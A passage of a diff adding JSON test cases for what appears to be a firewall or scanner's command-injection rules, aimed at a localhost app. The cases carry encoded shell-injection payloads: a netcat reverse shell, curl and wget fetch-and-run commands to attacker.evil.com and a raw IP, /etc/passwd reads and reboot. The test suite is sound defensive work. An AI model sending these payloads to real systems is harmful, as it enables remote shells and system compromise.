+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; ls -la /\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0035",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [double-urlencode]",
+    "description": "OS command injection via body:format: ; ls -la /",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; ls -la /\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0036",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: ; ls -la /",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20ls%20-la%20%2F",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0037",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [raw]",
+    "description": "OS command injection via query:name: | nc 10.0.0.1 4444 -e /bin/sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=| nc 10.0.0.1 4444 -e /bin/sh",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0038",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [double-urlencode]",
+    "description": "OS command injection via body:comment: | nc 10.0.0.1 4444 -e /bin/sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"| nc 10.0.0.1 4444 -e /bin/sh\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0039",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [nullbyte-suffix]",
+    "description": "OS command injection via body:format: | nc 10.0.0.1 4444 -e /bin/sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"| nc 10.0.0.1 4444 -e /bin/sh\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0040",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: | nc 10.0.0.1 4444 -e /bin/sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%7C%20nc%2010.0.0.1%204444%20-e%20%2Fbin%2Fsh",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0041",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [nullbyte-suffix]",
+    "description": "OS command injection via query:name: ; curl http://attacker.evil.com/x | sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=; curl http://attacker.evil.com/x | sh%00",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0042",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [nullbyte-suffix]",
+    "description": "OS command injection via body:comment: ; curl http://attacker.evil.com/x | sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; curl http://attacker.evil.com/x | sh\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0043",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [urlencode]",
+    "description": "OS command injection via body:format: ; curl http://attacker.evil.com/x | sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; curl http://attacker.evil.com/x | sh\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0044",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [urlencode]",
+    "description": "OS command injection via path: ; curl http://attacker.evil.com/x | sh",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20curl%20http%3A%2F%2Fattacker.evil.com%2Fx%20%7C%20sh",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0045",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: %0a/bin/cat%20/etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%25250a%252Fbin%252Fcat%252520%252Fetc%252Fpasswd",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0046",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [nullbyte-suffix]",
+    "description": "OS command injection via body:comment: %0a/bin/cat%20/etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"%0a/bin/cat%20/etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0047",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [nullbyte-suffix]",
+    "description": "OS command injection via body:format: %0a/bin/cat%20/etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"%0a/bin/cat%20/etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0048",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [urlencode]",
+    "description": "OS command injection via path: %0a/bin/cat%20/etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%250a%2Fbin%2Fcat%2520%2Fetc%2Fpasswd",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0049",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [nullbyte-suffix]",
+    "description": "OS command injection via query:name: ;`reboot`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=;`reboot`%00",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0050",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [raw]",
+    "description": "OS command injection via body:comment: ;`reboot`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \";`reboot`\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0051",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [urlencode]",
+    "description": "OS command injection via body:format: ;`reboot`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \";`reboot`\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0052",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: ;`reboot`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%60reboot%60",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0053",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: $(wget http://14.46.136.77/sh)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%2524%2528wget%2520http%253A%252F%252F14.46.136.77%252Fsh%2529",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0054",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [raw]",
+    "description": "OS command injection via body:comment: $(wget http://14.46.136.77/sh)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"$(wget http://14.46.136.77/sh)\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0055",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: $(wget http://14.46.136.77/sh)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"$(wget http://14.46.136.77/sh)\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0056",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [nullbyte-suffix]",
+    "description": "OS command injection via path: $(wget http://14.46.136.77/sh)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%24%28wget%20http%3A%2F%2F14.46.136.77%2Fsh%29",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0057",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [raw]",
+    "description": "OS command injection via query:name: ; ping -c 10 127.0.0.1",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=; ping -c 10 127.0.0.1",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0058",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [double-urlencode]",
+    "description": "OS command injection via body:comment: ; ping -c 10 127.0.0.1",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; ping -c 10 127.0.0.1\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0059",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [urlencode]",
+    "description": "OS command injection via body:format: ; ping -c 10 127.0.0.1",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; ping -c 10 127.0.0.1\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0060",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: ; ping -c 10 127.0.0.1",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20ping%20-c%2010%20127.0.0.1",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0061",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [nullbyte-suffix]",
+    "description": "OS command injection via query:name: || sleep 5",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=|| sleep 5%00",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0062",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [urlencode]",
+    "description": "OS command injection via body:comment: || sleep 5",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"|| sleep 5\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0063",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: || sleep 5",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"|| sleep 5\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0064",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [urlencode]",
+    "description": "OS command injection via path: || sleep 5",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%7C%7C%20sleep%205",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0065",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [nullbyte-suffix]",
+    "description": "OS command injection via query:name: ; python -c 'import os;os.system(\"id\")'",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=; python -c 'import os;os.system(\"id\")'%00",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0066",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [double-urlencode]",
+    "description": "OS command injection via body:comment: ; python -c 'import os;os.system(\"id\")'",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
